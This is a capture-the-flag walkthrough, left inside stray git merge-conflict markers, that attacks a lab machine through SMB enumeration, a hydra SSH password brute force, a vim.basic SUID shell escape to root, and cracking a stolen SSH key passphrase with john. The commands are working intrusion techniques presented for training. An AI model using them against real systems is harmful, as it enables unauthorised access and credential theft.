<<<<<<< HEAD
=======
***

Author: dxWiz

Date: 19 Mar 2022

***

# Task 1 Web App Testing and Privilege Escalation

Use the following command to enumerate the url for hidden directory

	gobuster dir -u $IP -w /usr/share/wordlist/dirbuster/diretory-list-2.3-medium.txt

and we found /development/ and two files dev.txt and j.txt, checkout both of the files.

From out initial nmap scan, we know that smb is present in the target, to list the available share, use the following command

	smbclient -L //$IP

then the next steps is to try connecting to the shared folder with the name of Anonymous

	smbclient //$IP/Anonymous -N

After that do and ***ls*** and ***get*** to download the file staff.txt. In the file there is a staff named Jan.

We will then use hydra to brute force jan password with the following command
	
	hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP

It is time to ssh into the target with the password obtained and we can start looking for any misconfigured SUID file with the following command

	find / -type f -perm -u=s 2>/dev/null

	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/snapd/snap-confine
	/usr/lib/openssh/ssh-keysign
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/bin/vim.basic
	/usr/bin/pkexec
	/usr/bin/newgrp
	/usr/bin/chfn
	/usr/bin/sudo
	/usr/bin/chsh
	/usr/bin/newgidmap
	/usr/bin/at
	/usr/bin/gpasswd
	/usr/bin/newuidmap
	/usr/bin/passwd
	/bin/su
	/bin/ntfs-3g
	/bin/ping6
	/bin/umount
	/bin/fusermount
	/bin/mount
	/bin/ping


vim.basic looks interesting and by referencing to [GTFObins](https://gtfobins.github.io/) we can do a **PE** with the following command

	/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' 


With the root access we can then go to kay home directory and read the pass.bak file to get the answer for the last question.

******

There is another way to gain root access without exploiting the misconfigured SUID file which is to get kay's ssh private key from her folder /home/kay/.ssh

We should do this before using the private key

	chmod 600 kay_id_rsa  

When we try to ssh with the following command 

	ssh -i kay_id_rsa kay@10.10.19.202
	Enter passphrase for key 'kay_id_rsa': 

It is asking for a passphrase, let's brute force the passphrase by first doing ssh2joh

	ssh2john kay_id_rsa > ssh2john.txt


It's time to brute force the passphrase of the key with john

	john --wordlist=/usr/share/wordlists/rockyou.txt ssh2john.txt
	
 and then ssh to the target and read the pass.bak file for answer.	
>>>>>>> 5e9fc03ee255660d50caf604b248fa6528e17521
